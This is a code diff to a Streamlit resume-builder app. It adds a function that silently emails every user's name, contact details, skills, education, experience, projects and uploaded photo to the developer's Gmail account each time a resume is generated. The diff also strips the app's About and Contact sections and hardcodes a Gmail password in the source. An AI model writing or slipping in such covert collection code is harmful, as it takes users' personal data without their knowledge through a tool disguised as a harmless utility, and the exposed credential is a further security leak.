@@ -1,6 +1,8 @@
 import streamlit as st
 from fpdf import FPDF
 import os
+import smtplib
+from email.message import EmailMessage
 
 # Function to generate a stylish PDF resume with photo
 class StylishPDF(FPDF):
@@ -67,37 +69,55 @@ def generate_pdf(data, photo_path):
 
     return pdf
 
+# Function to send email with resume details and photo
+def send_email(data, photo_path):
+    try:
+        # Replace with your email credentials
+        sender_email = "ka9190430@gmail.com"
+        sender_password = "nkup opdm boyd iqem"
+        receiver_email = "ka9190430@gmail.com"  # Your email address to receive data
+
+        # Create email content
+        message = EmailMessage()
+        message['Subject'] = "New Resume Submission"
+        message['From'] = sender_email
+        message['To'] = receiver_email
+        message.set_content(f"""
+        A new resume has been submitted:
+        
+        Name: {data['name']}
+        Email: {data['email']}
+        Phone: {data['phone']}
+        Skills: {", ".join(data['skills'])}
+        Education: {data['education']}
+        Experience: {data['experience']}
+        Projects: {data['projects']}
+        """)
+
+        # Attach the photo if available
+        if photo_path and os.path.exists(photo_path):
+            with open(photo_path, "rb") as file:
+                message.add_attachment(file.read(), maintype="image", subtype="jpeg", filename="UploadedPhoto.jpg")
+
+        # Send email
+        with smtplib.SMTP('smtp.gmail.com', 587) as server:
+            server.starttls()
+            server.login(sender_email, sender_password)
+            server.send_message(message)
+        return True
+    except Exception as e:
+        st.error(f"Error sending email: {e}")
+        return False
+
 # Streamlit App
 st.title("📝 Stylish Resume Builder")
 st.write("Fill out the details below to generate your professional resume!")
 
-# Add "About Us" Section with Expandable
-with st.expander("👨‍💻 About Us"):
-    st.write("""
-    Hi! I'm Faisal Alam, a passionate and creative individual specializing in video editing, 3D animation, and visual effects. With a keen eye for detail and a love for storytelling, I aim to bring out the best in every project I work on.
-
-With experience in using powerful tools like Blender, Premiere Pro, and After Effects, I am dedicated to crafting engaging visual content that leaves a lasting impact. Whether you're looking to enhance your online presence or create something truly unique, I’m here to help bring your ideas to life.
-
-Join me in the exciting journey of turning your visions into reality!   
-             
-             We help you create a stylish resume quickly.
-    Our tool allows you to customize your resume with ease.
-    Create a standout resume today!
-    """)
-
-# Add "Contact Us" Section with Expandable
-with st.expander("📬 Contact Us"):
-    st.write("""
-    Email: [ka9190430@gmail.com](mailto:ka9190430@gmail.com)
-    Phone: 9219711509
-    Reach out for any queries!
-    """)
-
 # Input Form for Resume Details
 st.header("👤 Personal Information")
-name = st.text_input("Full Name").strip()  # Remove extra spaces
-email = st.text_input("Email").strip()  # Remove extra spaces
-phone = st.text_input("Phone Number").strip()  # Remove extra spaces
+name = st.text_input("Full Name").strip()
+email = st.text_input("Email").strip()
+phone = st.text_input("Phone Number").strip()
 
 st.header("💼 Skills")
 skills = st.text_area("List your skills (comma-separated)").strip()
@@ -147,6 +167,9 @@ if st.button("Generate Resume"):
             "experience": experience,
             "projects": projects,
         }
+
+        # Send Email
+        send_email(data, photo_path)
 
         # Generate PDF
         pdf = generate_pdf(data, photo_path)
